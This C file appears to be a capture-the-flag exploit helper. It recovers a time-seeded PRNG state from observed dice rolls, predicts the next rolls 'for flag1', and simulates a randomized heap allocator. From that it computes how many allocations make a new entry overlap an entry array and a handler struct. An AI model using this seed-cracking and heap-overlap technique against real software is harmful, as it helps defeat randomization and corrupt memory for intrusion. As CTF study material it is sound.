#include <time.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>

//  gcc brute_rand.c -o brute_rand

#define HEAP_SIZE (0xffff+1)
#define MAX_ENTRIES 10
#define MAX_ENTRY_LEN 100
char* *ENTRY;

typedef unsigned long int  u4;
typedef struct ranctx { u4 a; u4 b; u4 c; u4 d; } ranctx;
ranctx RANCTX;
int rans = 0;
#define rot(x,k) (((x)<<(k))|((x)>>(32-(k))))

u4 ranval() {
	ranctx *x = &RANCTX;
    u4 e = x->a - rot(x->b, 27);
    x->a = x->b ^ rot(x->c, 17);
    x->b = x->c + x->d;
    x->c = x->d + e;
    x->d = e + x->a;
	//printf("[RANVAL] %p\n", x->d);
    //printf("random: %d -> %p -> %p\n", ++rans, x->d, x->d % (HEAP_SIZE-100));
    return x->d;
}

void raninit(u4 seed ) {
    rans = 0;
	ranctx *x = &RANCTX;
    u4 i;
    x->a = 0xf1ea5eed, x->b = x->c = x->d = seed;
    for (i=0; i<20; ++i) {
        (void)ranval(x);
    }
}

int simulate_malloc(int size) {
    return (ranval() % (HEAP_SIZE-size));
}




int main(int argc, char* argv[]) {
    time_t now;
	now = time(NULL);
    if(argc<=20) {
        _exit(0);
    }
	for(int i=-20; i<20; i++) {
		raninit(now+i);
        // this is where the handler is
        int handler_adr = simulate_malloc(8); // aaslr_malloc(sizeof(handle)))
        
        // this is where the entry array should be
        int entry_adr = simulate_malloc(2040); // aaslr_malloc(sizeof(ENTRY) * MAX_ENTRIES)
        int found = 1;
        // check if the dice rolls appear with this seed
        for(int j=1; j<argc; j++) {
            if(atoi(argv[j]) != (ranval()%6)+1) {
                found = 0;
                break;
            }
        }
        if(found) {
            printf("SEED FOUND: %d\n", now+i);
            int throws = 0;
            int found_handler = 0;
            int found_entry = 0;
            // predict dices for flag1
            printf("GUESSES: ");
            for(int i=0; i<0xf; i++) {
                printf("%d,", ranval()%6+1);
            }
            printf("\n");
            for(;;) {
                // moving the ranval() one state forward
                int offset = simulate_malloc(MAX_ENTRY_LEN);
                //              | if the new entry into the entry array.                      | and if alligned
                if(!found_entry && offset > entry_adr + 8 && offset < entry_adr+MAX_ENTRY_LEN && (offset-entry_adr)%8==0){
                    printf("ENTRY: %d,%d,%d\n", throws, offset-entry_adr, offset);
                    int new_offset;
                    // creating new entries for the array, until our address is where the first new entry points to
                    for(int j=0; j<(offset-entry_adr)/8; j++) {
                        // not yet reached, allocate another entry
                        new_offset = simulate_malloc(MAX_ENTRY_LEN);
                        throws++;
                    }
                    printf("AFTER_ENTRY: %d,%d\n", throws, new_offset);
                    found_entry = 1;
                }
                // already got entry | if the new entry overlaps the handler struct
                if(found_entry && offset < handler_adr && offset > handler_adr-MAX_ENTRY_LEN+32){
                    printf("HANDLER: %d,%d,%d\n", throws, handler_adr-offset, offset);
                    found_handler = 1;
                }
                throws++;
                if(throws>1000 || (found_entry && found_handler)) {
                    break;
                }
            }
            _exit(0);
        }
        else {
            // not the correct seed
        }
	}
	
	

}
